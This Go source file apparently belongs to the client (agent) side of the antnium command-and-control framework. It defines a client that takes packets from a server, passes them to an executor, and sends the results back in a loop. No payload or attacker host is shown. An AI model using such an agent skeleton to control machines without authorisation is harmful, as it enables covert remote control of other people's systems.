package client

import (
	"errors"

	"github.com/dobin/antnium/executor"
	"github.com/dobin/antnium/model"
)

var ErrNoPacketsFound = errors.New("Server did not return any packets")

type Client struct {
	Config   ClientConfig
	Campaign model.Campaign

	packetExecutor executor.PacketExecutor
	upstream       Upstream
	downstream     Downstream
}

func NewClient() Client {
	config := MakeClientConfig()
	campaign := model.MakeCampaign()
	executor := executor.MakePacketExecutor()
	upstream := MakeUpstream(config, campaign)
	downstream := MakeDownstream()

	w := Client{
		config,
		campaign,
		executor,
		upstream,
		downstream,
	}
	return w
}

func (s *Client) Start() {
	// start Downstream thread
	go s.downstream.start()
	// start Upstream thread
	go s.upstream.start()

	var p model.Packet
	for {
		// Block until we receive a packet from server
		p = <-s.upstream.channel

		// Send it to the appropriate channel/downstream
		// if...
		s.downstream.channel <- p

		// Receive answer
		p = <-s.downstream.channel

		// Send answer back to server
		s.upstream.channel <- p
	}
}
